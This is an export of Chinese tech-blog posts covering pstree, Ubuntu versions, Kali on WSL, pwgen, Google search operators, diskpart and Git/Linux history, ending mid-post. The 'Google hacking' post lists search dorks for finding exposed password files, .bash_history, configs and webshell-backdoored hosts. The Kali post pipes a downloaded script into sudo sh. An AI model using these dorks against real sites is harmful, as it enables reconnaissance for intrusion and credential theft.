    <content type="text"><![CDATA[pstree是linux很有用的一个命令，显示正在运行的进程树,用来打印系统当前各个进程父子关系。然而linux下安装的软件包并不是叫 pstree： On Mac OS安装方法:brew install pstree On Fedora/Red Hat/CentOS安装方法:yum install psmisc On Ubuntu/Debian APT安装方法:apt-get install psmisc Linux虽然内建有查看当前进程的工具ps,Processes Status的缩写。但是我个人感觉还是pstree以树状图的方式展示出来的效果更好些。下面我示范在Ubuntu下安装。1lengyue@ubuntu:~$ sudo apt-get install psmisc 查看一些命令的参数及其说明。Tips:在我们安装 一些命令的时候，一定要先查看一下manual手册，以便可以更好的了解该命令和使用该命令及其参数。1lengyue@ubuntu:~$ man pstree 以下是我导出的一些重要参数说明，大家可以看一下。 1234567891011-a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示；-c：不使用精简标示法；-G：使用VT100终端机的列绘图字符；-h：列出树状图时，特别标明现在执行的程序；-H&lt;程序识别码&gt;：此参数的效果和指定"-h"参数类似，但特别标明指定的程序；-l：采用长列格式显示树状图；-n：用程序识别码排序。预设是以程序名称来排序；-p：显示程序进程ID，为十进制数字；-u：显示用户名称；-U：使用UTF-8列绘图字符；-V：显示版本信息。 简单操作:1lengyue@ubuntu:~$ pstree 1lengyue@ubuntu:~$ pstree -a 可以显示出一些隐藏的进程。1lengyue@ubuntu:~$ pstree -p 然后如果我们发现什么可疑的进程，可以使用kill杀死进程就可以了。好了，如果还有什么不懂的可以进群问我。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Ubuntu的那些常识]]></title>
    <url>%2F2018%2F03%2F08%2F%E5%85%B3%E4%BA%8EUbuntu%E7%9A%84%E9%82%A3%E4%BA%9B%E5%B8%B8%E8%AF%86%2F</url>
    <content type="text"><![CDATA[Ubuntu的命名规则Ubuntu版本的命名规则是根据正式版发布的年月命名，例如：Ubuntu 16.04 LTS也就意味着2016年4月发布的这款Ubuntu，而LTS是英语Long Term Support的简写，意味着长时间支持这款版本的Ubuntu。 Ubuntu的开发代号的三个特点都是动物都是两个词，并且两个词的首字母相同从6.06开始，首字母从D开始递增可参照下表 Ubuntu的版本更新周期 桌面版和服务器版本更新的时间是 6 个月，Ubuntu定期并有计划的不断发布其新版本,Ubuntu 一直坚持每6个月发布一个新的版本。并致力于在该发行版的支持期内持续的发布安全和关键补丁。 Ubuntu 将为每个版本提供至少18个月的支持研发人员与用户可从版本号码就知道正式发布的时间。并且会每2年发布一个LTS的版本。 Ubuntu 的版本支持时间 对于 desktop 版本和 server 版本，ubuntu 会提供至少18个月的技术支持。 对于 LTS 版本（Long Term Suppot）长期支持版本，desktop 版的会提供至少 3 年技术支持，server 版本的会提供至少 5 年技术支持。 Ubuntu 的各个版本 (最新发行版主要提供 Desktop 和 Server 两种版本)Desktop版本：desktop 是 live cd 的名字,什么是 live cd? live cd 是一个刻录在光盘上的操作系统，我们并不需要硬盘就可以直接在光盘上运行这个操作系统。里面也已经集成了很多软件，我们一般可以把这个系统安装到硬盘上，类似于ghost系统，安装速度会比较快。这个版本提供了向导的图形界面的方式，让你一步步来轻松地安装 ubuntu (一般都安装这个系统的 32 位 i386 版本）Alternate版本：是一个最标准的安装版本，采用文本安装界面，里面有很多高级选项，可以安装 desktop ,也可以安装 server 版，适合比较高要求的人来安装，安装速度比 desktop 版慢，但是运行时的效率比 desktop 版本快Netbook版本：专门为上网本定制和优化，最近的版本采用了 Unity，为小屏幕提供了一种美观的用户界面，采用了大图标设计，让用户更容易寻找各种应用程序DVD版本：里面包括 Desktop 和 Alternate 两种安裝模式，同时集成更多的软件和完整的语言包，假如你没有联网可以选择下这个版本Minimal版本：安装 Ubuntu 的最小镜像版本其他的可以参考本篇文章Ubuntu的官方文档]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows安装kali和Debian]]></title>
    <url>%2F2018%2F03%2F07%2FWindows%E5%AE%89%E8%A3%85kali%E5%92%8CDebian%2F</url>
    <content type="text"><![CDATA[继 SUSE 和 Ubuntu 之后，Windows 10 的应用商店刚刚又加入了两个新的 Linux 发行版 —— Debian GNU/Linux 和 Kali Linux事实上，Kali 团队在 2 月 21 日就曾宣布了这个消息，并发布了一个安装演示视频。只不过当时该发行版并未得到 Windows Subsystem for Linux (WSL) 的官方支持。在和 WSL 团队的通力合作下，现在用户在 Windows 10 应用商店上简单点击 “获取” 就能进行安装。具体可以看kali官方文档对于各位来说kali Linux并不陌生，之前我们用Kali Linux,要不是U盘，要不然就是安装双系统，或者直接运行在虚拟机上。现在可以Windows10下直接玩Kali,方便多了。对于各位玩家来说绝对是个好消息，现在可以在Windows 10上本地使用，无需双启动或虚拟化。可以更方便你来使用kali进行渗透。而在之前Windows支持Ubuntu后，现在又支持了Debian这个Linux发行版了。Debian 带来了超过 51000 个软件包（为了能在您的机器上轻松地安装，这些软件包都已经被编译包装为一种方便的格式），一个软件包管理器（APT），以及其他帮助您在上千台计算机上管理数千个软件包的工具，过程就如安装一个应用程序那么简单。而这些全都是自由软件。 而这两款Linux安装和之前Ubuntu的安装方法一样，可以参考本篇Windows上安装Ubuntu子系统来进行安装。下面我教各位安装kali的图形化界面。123456wget https://kali.sh/xfce4.shsudo sh xfce4.sh[+]Configuring XRDP to listen on port 3390(but not staring the service)...sudo /etc/init.d/xrdp start #记住端口3390远程桌面链接127.0.0.1:3309sudo /etc/init.d/xrdp stop #停止桌面]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux密码生成器]]></title>
    <url>%2F2018%2F03%2F05%2FLinux%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8%2F</url>
    <content type="text"><![CDATA[pwgen是一款在Linux上的密码生成器，生成的密码易于记忆且相当安全.首先我们先安装pwgen。安装完成后，我们查看一下帮助手册，了解这款工具的特点以及命令参数。现在我做一下简单的操作，以便各位可以更好的了解这款工具。不加任何参数，直接输入pwgen，就可以输出满屏的密码 ，你可以从中挑选一个作为你的密码。然后按ctr+L，清除屏幕。你也可以让pwgen只生成一个密码。可以从图中看到每次生成的密码都是随机的，不是固定的。pwgen也允许生成带有特殊字符的密码。当然前提是需要你你输入密码的程序支持特殊字符。使用”-s”则可以完全随机的生成一个密码。当然你也可以指定生成密码的位数。现在生成一个长度为10的一个密码。生成若干长度为10的密码。下面是一些常用的pwgen命令参数，就不一一示范了。pwgen 命令常用参数：-0：密码中不包含数字。-B, –ambiguous：密码中不包含容易混淆的字符，比如说“1”和“l”、“0”和“O”。-v, –no-vowels：密码不包括元音字母或者可能被误认为是元音字母的数字。Tips:如果你想不出很好很安全的密码，你可以使用这款工具来帮助你。如果你怕在使用的过程中忘记这些密码，你可以配合1Password等密码管理工具。可以帮助你更好的管理使用密码。这样你的密码就更为安全了。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google hacking]]></title>
    <url>%2F2018%2F03%2F02%2FGoogle-hacking%2F</url>
    <content type="text"><![CDATA[黑客去入侵一个网站的时候往往需要搜集它的很多信息，这其中包括利用网站漏洞，社工，还有就是用搜索引擎进行搜索，而常被我们利用的搜索网站——谷歌就是一个非常好的信息搜索工具，下面就给大家普及一下谷歌搜索的技巧。Google hacking常见的攻击规律Google hacking主要是发现那些公告文件，安全漏洞，错误信息， 口令文件， 用户文件， 演示页面，登录页面， 安全文件， 敏感目录，商业信息，漏洞主机， 网站服务器检测等信息。攻击规律有： 利用”Index of”语法检索出站点的活动索引目录。Index 就是主页服务器所进行操作的一个索引目录。黑客们常利用目录获取密码文件和其他安全文件。常用的攻击语法如下： Index of /admin 可以挖掘到安全意识不强的管理员的机密文件： 黑客往往可以快速地提取他所要的信息，其他Index of 语法列表如下： Index of /passwdIndex of /passwordIndex of /mailIndex of / +passwdIndex of / +password.txtIndex of / +.htaccessIndex of /secretIndex of /confidentialIndex of /rootIndex of /cgi-binIndex of /credit-cardIndex of /logsIndex of /config 利用”inurl:”寻找易攻击的站点和服务器。（1）利用”allinurl:winnt/system32/“寻找受限目录”system32”，一旦具备 cmd.exe 执行权限，就可以控制远程的服务器。 （2）利用”allinurl:wwwboard/passwd.txt”搜寻易受攻击的服务器。 （3）利用”inurl:.bash_history”搜寻服务器的”.bash_history”文件。这个文件包括超级管理员的执行命令，甚至一些敏感信息，如管理员口令序列等。 （4）利用”inurl:config.txt”搜寻服务器的”config.txt”文件，这个文件包括管理员密码和数据认证签名的hash值。 （5）其他语法的搜索。inurl:admin filetype:txtinurl:admin filetype:dbinurl:admin filetype:cfginurl:mysql filetype:cfginurl:passwd filetype:txtinurl:iisadminallinurl:/scripts/cart32.exeallinurl:/CuteNews/show_archives.phpallinurl:/phpinfo.phpallinurl:/privmsg.phpallinurl:/privmsg.phpinurl:auth_user_file.txtinurl:orders.txtinurl:”wwwroot/*.”inurl:adpassword.txtinurl:webeditor.phpinurl:file_upload.phpinurl:gov filetype:xls “restricted”index of ftp +.mdb allinurl:/cgi-bin/ +mailto 利用”intitle:”寻找易攻击的站点或服务器。（1）利用 intitle:”php shell*” “Enable stderr” filetype:php查找安装了php webshell后门的主机，并测试是否有能够直接在机器上执行命令的web shell。（ http://worldispnetwork.com/phpinfo.php） （2）利用allintitle:”index of /admin”搜寻服务器的受限目录入口”admin”。上面是一些简单容易了解记忆的搜索技巧，关于谷歌的搜索技巧还有很多，有兴趣的可以网上找找这类语法记住，这些技巧对你以后的黑客学习过程中有很大的作用。 上面的搜索语法是从谷歌搜索到的，我们可以用百度搜一下也会有部分信息，有条件的可以直接用谷歌进行搜索。]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用谷歌查找信息的各种姿势]]></title>
    <url>%2F2018%2F03%2F02%2F%E5%88%A9%E7%94%A8%E8%B0%B7%E6%AD%8C%E6%9F%A5%E6%89%BE%E4%BF%A1%E6%81%AF%E7%9A%84%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[谷歌的大名大家一定都听过。这款搜索引擎真的是相当强大。如果利用好的话可以搜索出很多很多的信息。Google内置了很多高级搜索语法.如果你掌握这些语法的话，你可以让你的生活工作更加高效。各种语法如下:intitle：表示搜索在网页标题中出现第一个关键词的网页。allintitle: 可以搜索网页标题中同时含有多个关键词的链接。intext：返回网页的文本中出现关键词的网页。allintext: 搜索多个关键字。inurl：返回的网页链接中包含第一个关键字的网页。site：在某个限定的网站中搜索。filetype：搜索特定扩展名的文件（如.doc .pdf .ppt）。例如：.pwl口令文件、.tmp临时文件、.cfg配置文件、.ini系统文件、.hlp帮助文件、.dat数据文件、.log日志文件、.par交换文件等等。link：表示返回所有链接到某个地址的网页。related：返回连接到类似于指定网站的网页。cache：搜索Google缓存中的网页。info：表示搜索网站的摘要。例如”info:whu.edu.cn”仅得到一个结果。phonebook：搜索电话号码簿，将会返回美国街道地址和电话号码列表。rphonebook：仅搜索住宅用户电话号码簿。bphonebook：仅搜索商业的电话号码簿。另外，还有一些不常用的搜索指令。如下：author：搜索新闻组帖子的作者。group：搜索Google组搜索词汇帖子的题目。msgid：搜索识别新闻组帖子的Google组信息标识符和字符串。insubject：搜索Google组的标题行。stocks：搜索有关一家公司的股票市场信息。define：返回一个搜索词汇的定义。inanchor：搜索一个HTML标记中的一个链接的文本表现形式。daterange：搜索某个日期范围内Google做索引的网页。]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[制作系统盘的U盘容量突然变小了怎么办？]]></title>
    <url>%2F2018%2F03%2F01%2F%E5%88%B6%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9B%98%E7%9A%84U%E7%9B%98%E5%AE%B9%E9%87%8F%E7%AA%81%E7%84%B6%E5%8F%98%E5%B0%8F%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[当你使用U盘制作启动盘装完系统后，你会发现你的U盘容量变小了。就拿我的来说吧，我在昨天给家里的另外一台电脑重装完系统后，突然发现自己本来是16g的U盘，结果就剩1g多了。为什么会这样呢？我们如果遇到应该怎么恢复到原来的容量呢？？？下面开始开始我们的恢复U盘容量的教程。你可以打开隐藏文件夹，你会看到还有文件，你格式化都不行。这个文件根本不能删除。而且你打开属性里面，你可以看到这个U盘里面制作的系统还在。格式化对他们是不起任何作用的。这个时候需要磁盘操作命令，和cmd命令类似。win+R，输入diskpart。打开diskpart.exe。diskpart其实是个内置于windows系统的小程序，不过并不被人们所熟知。是属于命令行的工具，没有GUI界面。然后输入命令1list disk 选择我们的U盘，磁盘1。1select disk 1 开始清除其中的数据。1clean 这个时候你会发现你的U盘已经图标已经没了。你再次插入U盘依然不会显示出来的。因为U盘已经被系统彻底清除了，电脑中已经没有U盘可见的盘符了。这个时候我们无需担心，接下来我们就+把丢失的U盘找回来。按下快捷键win+X,选择“磁盘管理”，打开。或者右击“我的电脑”，选择管理，选择“磁盘管理”。找到自己的U盘。这个时候显示的还是未分配模式。右击“新建简单卷”，一直跟着提示操作重新建立U盘格式就可以了。然后就成功找回自己的U盘了。我们可以再次文件，你会看到自己的U盘就在那里。Tips:如果你想了解更多的磁盘操作命令的话，你可以在diskpart中键入help，你就可以直接查看所有的命令参数了，每个参数对应的操作上面都有解释，很详细。好了，教程结束，撒花★,°:.☆(￣▽￣)/$:.°★ 。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux之父与GitHub的那些事]]></title>
    <url>%2F2018%2F02%2F28%2Flinux%E4%B9%8B%E7%88%B6%E4%B8%8EGitHub%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[很多人都知道，Linus在1991年创建了开源的Linux，从此，Linux系统不断发展，已经成为最大的服务器系统软件了。Linus虽然创建了Linux，但Linux的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为Linux编写代码，那Linux的代码是如何管理的呢？事实是，在2002年以前，世界各地的志愿者把源代码文件通过diff的方式发给Linus，然后由Linus本人通过手工方式合并代码！你也许会想，为什么Linus不把Linux代码放到版本控制系统里呢？不是有CVS、SVN这些免费的版本控制系统吗？因为Linus坚定地反对CVS和SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比CVS、SVN好用，但那是付费的，和Linux的开源精神不符。不过，到了2002年，Linux系统已经发展了十年了，代码库之大让Linus很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是Linus选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。安定团结的大好局面在2005年就被打破了，原因是Linux社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发Samba的Andrew试图破解BitKeeper的协议（这么干的其实也不只他一个），被BitMover公司发现了（监控工作做得不错！），于是BitMover公司怒了，要收回Linux社区的免费使用权。Linus可以向BitMover公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是这样的：Linus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git！一个月之内，Linux系统的源码已经由Git管理了！牛是怎么定义的呢？大家可以体会一下。Git迅速成为最流行的分布式版本控制系统，尤其是2008年，GitHub网站上线了，它为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub，包括jQuery，PHP，Ruby等等。历史就是这么偶然，如果不是当年BitMover公司威胁Linux社区，可能现在我们就没有免费而超级好用的Git了。很多人都知道，Linus在1991年创建了开源的Linux，从此，Linux系统不断发展，已经成为最大的服务器系统软件了。Linus虽然创建了Linux，但Linux的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为Linux编写代码，那Linux的代码是如何管理的呢？事实是，在2002年以前，世界各地的志愿者把源代码文件通过diff的方式发给Linus，然后由Linus本人通过手工方式合并代码！你也许会想，为什么Linus不把Linux代码放到版本控制系统里呢？不是有CVS、SVN这些免费的版本控制系统吗？因为Linus坚定地反对CVS和SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比CVS、SVN好用，但那是付费的，和Linux的开源精神不符。不过，到了2002年，Linux系统已经发展了十年了，代码库之大让Linus很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是Linus选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。安定团结的大好局面在2005年就被打破了，原因是Linux社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发Samba的Andrew试图破解BitKeeper的协议（这么干的其实也不只他一个），被BitMover公司发现了（监控工作做得不错！），于是BitMover公司怒了，要收回Linux社区的免费使用权。Linus可以向BitMover公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是这样的：Linus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git！一个月之内，Linux系统的源码已经由Git管理了！牛是怎么定义的呢？大家可以体会一下。Git迅速成为最流行的分布式版本控制系统，尤其是2008年，GitHub网站上线了，它为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub，包括jQuery，PHP，Ruby等等。历史就是这么偶然，如果不是当年BitMover公司威胁Linux社区，可能现在我们就没有免费而超级好用的Git了。十年前的这一周，linux 内核社区面临一个根本性的挑战：他们不再能够使用他们的修复控制系统：BitKeeper，同时其他的软件配置管理遇到了对分布式系统的新需求。Linus Torvalds，Linux的创始人，将这个挑战接手并消失了数周，创造了 Git 工具。今天 Git 被用于成千上万个工程，并且在程序员社区中掀起了一个新的社会化编码的浪潮。为了庆祝这一里程碑，我们请 Linus 去分享 Git 的幕后故事，并且告诉我们这个工程队软件开发的影响。你会发现他在这个故事背后的的评论。我们跟随者Q&amp;A追寻Git的轨迹，同时我们为其他的工程也描绘了轮廓。去查找KVM，Qt，Drupal，Puppet和wine背后的故事。 为什么开发Git?Torvalds: 我其实根本不想做源码管理，我认为源码管理是计算机领域最无趣的事（可能数据库更无趣 ;^）。我对SCM(源码管理工具)感到愤怒。但是BitKeeper的出现让我重新认识了源码管理。BK (BitKeeper)大多数都是正确的,但有本地副本的存储库与分布式合并是一个大问题。分布式源码管理的一个主要问题是源码管理的分离——谁才可以提交改变。BK展示了如何通过每个人都有源码库来避开这个问题。但是BK也有自己的问题：几种技术导制了这种问题（恼火的重命名），但最大的问题是它不开源，这让很多人不愿意使用它。因此，当我们以几个核心的维护使用BK而告终——它们是免费使用的开源项目——但它们无处不在。BK帮助了内核开发者，但是它还是有痛点。当Tridge (Andrew Tridgell)对（相当简单的） BK 协议进行逆向工程–这是有悖于BK的使用规则的–的时候，事情到了不得不解决的地步。 我花了几个星期（几个月？我觉得是那样）在Tridge 和 Larry McVoy之间做调解，但是到最后，明显不起任何作用。于是，从那个时刻起，我决定不再继续使用BK，也不愿重回使用BK之前的糟透了的日子。同时，令人遗憾的是，一些其它的SCM，尝试着做分布式的事情，但是远程访问也没有处理好。我有性能的需求，不仅仅是满足远程可用，同时我还担心代码完整性和整个工作流，于是我决定自己写一个。 你是如何着手做这件事的?你是整个周末都在写代码，还是只在固定的几个小时呢?Torvalds: 嗨，实际上，你可以从git的源代码仓库中，查看它是如何成型的，除了大概是最开始的一天。我大约花了一天时间来让git“自我管控”（self-hosting），这样，我就可以通过git来提交代码（commit）到git。所以大概第一天是隐藏的，但是所有其它的东西都在那里了。编码工作大多数在白天，但是也有少数在午夜，也有一些在凌晨2点。最有趣的部分是，它成型非常快；git树中的第一个commit并没有很多代码，但是它已经做了最基本的事情–可以提交（commit）自己。其中的技巧实际上不在于代码，而在于想出它如何组织数据的办法。所以，我想说，git在大约10天左右的时间之后的样子（在这个点，我使用git做了kernel的第一次提交），它并不像某些疯狂的垃圾编码（而是有实际的使用价值）。早期的代码量实际上非常小，它的目标是正确实现基本点。 在整个项目开始之前，我一直在仔细考虑。我意识到其他人遇到的问题，也想到了要避免去做的事情。 它的存在周期达到了你的预期吗? 你认为它目前应该如何工作呢? 是否有一些限制呢?Torvalds: 我对git非常满意。对于kernel的开发，它做的非常非常好，满足了我所有的预期。让我觉得有趣的是，它是如何接管了许多其它项目的。结果是令人吃惊的。在更换源代码管理系统的时候，有很大的惯性；看看CVS，甚至是RCS，它们占据了多长时间，但是，某个时刻起，git就完全接管了。 你觉得它为何如此广泛的被采用呢?Torvalds: 我认为，其他许多人像我一样，都被同样的问题弄得灰心丧气，这些问题让我厌恶SCM。许多项目由于试着解决一两个边边角角的小问题而让人们抓狂，并不是像git这样真正的着手解决重要的问题。即便人们并不知晓“分布式”的部分有多么重要（许多人曾反对它），只要他们弄明白，git允许简单可靠的备份，同时允许人们生成他们自己私有的仓库，而不用担心一些中心仓库的拥有写访问权限的策略，他们是绝不会再回到以前的版本管理的。 Git会永远存在下去吗？或者说，您是否预见到在下一个10年中将会有其他的版本控制系统出现？你会是这个系统的作者之一吗？Torvalds：不，我不会是这些作者中的一员。我们在10年内或许可以看到一些新的东西，但我保证这些东西也会是“类Git”的。这并不是说Git能正确地处理所有的事情，但它以一种前所未有的方式把最为基本的问题都解决了，在这之前没有一款软件配置管理工具（SCM）可以与之媲美。我可以毫不谦虚地说 ; 为什么Git能在Linux上工作得如此好？Torvalds:好吧，很明显的它就是为了我们的工作流程而设计，因此他本身就是Linux的一部分。我已经多次提到完全“分布式”的部分，但它值得一再提及。它被设计得在面对像Linux的大型项目时有足够的效率，并且它被设计得去完成在它之前人们认为很“难”的任务——因为那些事情“我”每天都在做。只举一个例子：代码合并的概念在多数源码管理工具中通常被认为是非常痛苦和困难的。你会计划你的代码合并，因为那是重大的决定。那样的情况对我而言不能接受，自从我一天在合并的窗口前做数十次的代码合并之后，最头疼的的问题不是代码合并工作本身，最重要的应该是检查其结果。Git中，代码合并只会花费数秒，编写代码合并的注释文字却会花费我很长时间。因此，Git基本上按照我的需求设计和编码，也这样工作的。 有人说Git只是为聪明人设计的，甚至连Andrew Morton都说：“Git经过特意设计，以便让你感到自己不够聪明。”您对此有何回应？Torvalds：我想在以前确实如此，但现在不同了。因为某些原因，人们觉得git难用，但我认为现在只剩一个原因，那就是：你可以用很多种方法完成一件事。通过git你可以完成很多事请，git要求人们遵守许多规则，这些规则并非出于技术上的限制，而是为了让人们可以更好的合作。git是一个强大的工具，开始使用时你会感觉很困难，这通常是因为你可以用不同方法完成一件事，而且这些方法都能工作！一般说来，学习git最好的方法可能是，你先用它做最基本的事情，直到你熟悉这些基本操作，再去了解git的其它用法。 git的复杂有一些历史原因，其中之一是：它过去就很复杂！git的早期用户是那些为Kernel编程的人，他们不得不学习一系列非常难用的脚本。把绝大多数的精力花费在让git能用，而不是更易用。所以早期git给大家的印象（确实就）是，你必须很清楚自己在做什么。当然，在最初的半年或一年里，事实确实如此。人们感觉git复杂的另一个原因：git不同以往的SCM。许多人使用CVS十年甚至二十年，但git不是CVS，它们一点也不像。git和CVS的设计理念不同，命令也不同。git从来没有想过模仿CVS，甚至相反。如果你曾经长时间使用CVS风格的SCM系统，就会感觉git很复杂，并且觉得那些和CVS不同的设计没有存在的必要。奇怪的修订编号会让你分心，你心想：为什么git的修订编号不能像CVS的1.3.1那样累加，而要选择一个奇怪的40字节的十六进制数呢？但git并不是要故意标新立异。git确实和CVS存在差异，因为人们有不同的知识背景，所以这些差异使人们感觉其中一个比另一个复杂。CVS背景的东西正在渐渐远去，可能现在很多用过git的人从来没有用过CVS，他们就会不习惯CVS的使用方式。 你认为没有git，Linux Kernel能达到目前的开发速度吗？Torvalds：呃，没有git，我认为可以。但那意味着需要有人写出与git相似的工具：一个像git一样高效的分布式的SCM。没错，我们确实需要像git这样的东西。本篇文章为转载内容，具体原文可以查看以下内容。 原文1 原文2]]></content>
      <categories>
        <category>活在传说中的大佬</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[没有比尔·盖茨的鼎鼎大名，但他却创造了抗衡 Windows 的不朽传奇]]></title>
    <url>%2F2018%2F02%2F28%2F%E6%B2%A1%E6%9C%89%E6%AF%94%E5%B0%94%C2%B7%E7%9B%96%E8%8C%A8%E7%9A%84%E9%BC%8E%E9%BC%8E%E5%A4%A7%E5%90%8D%EF%BC%8C%E4%BD%86%E4%BB%96%E5%8D%B4%E5%88%9B%E9%80%A0%E4%BA%86%E6%8A%97%E8%A1%A1-Windows-%E7%9A%84%E4%B8%8D%E6%9C%BD%E4%BC%A0%E5%A5%87%2F</url>
    <content type="text"><![CDATA[你知道Linux系统有多牛吗？迄今为止，在全球范围内：80%以上的智能手机用的都是基于Linux内核的Android系统。全球超级计算机排名前500中有98%都在用Linux，包括中国制造、世界超算第一的神威太湖之光。全球大部分证券交易市场都在用Linux，包括纽交所、纳斯达克、伦敦证券交易所、东京证券交易所等75%的云计算企业报告平台都用Linux全球主机行业有33.8%的服务器都用Linux，而Windows 系统服务器只占7.3%。包括亚马逊、易趣网、沃尔玛等电子商务平台都在用Linux……换句话说，当今世上大部分的软件和服务都运行在Linux 操作系统之上，各种云计算、大数据、移动互联网，说起来吊炸天，但如果没有Linux，一切都是浮云。但你肯定想象不到，如此牛到天际的系统却是李纳斯·托沃兹（后文简称“李纳斯”）在经历各种纠结与挣扎之后的无奈发明。酷爱编程的Linux之父李纳斯1969年出生于芬兰赫尔辛基，十岁时因外祖父是大学统计学教授的缘故，得以接触计算机。那是一台Commodore VIC-2，在当时为世界上第一批廉价的8位家用电脑。这台电脑除了用Basic语言写程序之外别无它用。起初他只是将外祖父写在纸上的程序录入电脑，但是他天资聪颖，喜欢钻研，帮祖父录完程序后，就开始阅读电脑手册，写里面的示范程序，示范程序写完了，就自己编写程序。一段时间后，他又开始琢磨电脑是怎样工作的，以及思索如何能让电脑运行得更快……就这样三年过去了，在其他孩子都在滑雪、踢足球，进行各类户外游戏时，李纳斯却觉得外公的电脑更有意思了。这时候的他已经进入了青春期，同龄的男孩子都在被窝里偷偷看playboy杂志，而他却总是在跟妈妈道完晚安之后再偷偷地从床上爬起来，然后打开电脑编程。编程令他废寝忘食。他的妈妈逢人便说李纳斯是个很好养的孩子，一台电脑加一些意大利面条，就能让他心满意足。就是对女孩子不感兴趣这一点让他的父母非常担心。他的爸爸给他买了一些模型飞机、轮船、汽车、铁路和模型火车等好玩的玩具，但这些东西远远比不上电脑对他有吸引力。他的父母并不限制他玩电脑，但是在对他的管教方面，却多了一个杀手锏，若是他不听话，只要剥夺他玩电脑的权利，他立马就怂。上高中后，他的数学成绩非常优秀，那时的女孩子都特别希望能得到“数学天才”的辅导，于是他的父母就发现了让他对女孩子产生兴趣的办法，隔三差五催他带女孩子回家来辅导。而他自然也是照做了，只是即便这样，直到高中毕业他也没弄明白同学间说的“深度爱抚”是什么意思。为此他特意花了不少时间照顾邻居家一只十五磅重的猫，然后认为“深度爱抚”也没有什么了不起的。 ##快乐不能久留，纠结与无奈常伴左右后来Commodore VIC-2李纳斯已经玩得很溜了，便想买一台下一代的电脑。为此他攒了圣诞节和生日时父母给的奖励金，参加了赫尔辛基公司清洁队，当过邮差，再加上学校发的奖学金，在1987年的时候他成功地买下了一台Sinclair QL。这是世界第一台32位家用计算机，采用摩托罗拉68008处理器，操作系统是Q-DOS。它的BASIC 语言非常先进，图形显示也不赖，且能进行多重任务处理。他用之做了大量编程，还编写了工具性程序。但是令他无比纠结的是：VIC-2只有一个只读操作系统，无法重编程，而且虽说能进行多重任务处理，但在任何时候都会出现死机，也因为没有保存措施，只要一个任务出现差错，整个机子就死掉了。此外，给这台电脑购买配套设备是个无解的难题，因为他压根儿就找不到Sinclair QL电脑的产品目录！第二年，他考上了赫尔辛基大学，主修计算机，数学和物理是辅修。这一年他没怎么写程序。主要是Sinclair QL毛病太多，让他没了心情。大学第二年，他有两个选择：要么在部队服八个月的兵役，要么从事一年的社会服务工作。他选择了去服兵役，因为他觉得在军队服役能更好玩一点。服兵役也有两个选择：当一个普通大兵，服满要求的八个月或是去一所军官培训学校，当十一个月的军官。他选择了后者，因为他觉得当一名军官可能会更有意思。1986年的时候386芯片横空出世，它在功能上完美地取代了68020，PC机开始受追捧。而等到1990年的时候，大规模生产使其价格大幅下跌，这让手头拮据的李纳斯看到了希望。这一年，恰好他服完兵役回校，当时UNIX操作系统因稳定而强大的功能在学术界掀起了的风潮，学校也在这一年引入了UNIX系统，对此他兴奋不已。虽然他没钱买386，但是他可以让自己的Sinclair QL通过终端仿真进入大学的UNIX电脑，等到有了足够的钱再买自己的也不迟。而UNIX系统果然没有令他失望，他重新在电脑这里找到了快乐。1991年新年，他以分期付款的方式购买了一台组装PC机。内存他选择了4兆，最大的；CPU他选择了33 兆赫，最好的。不过这台电脑自带的MS-DOS 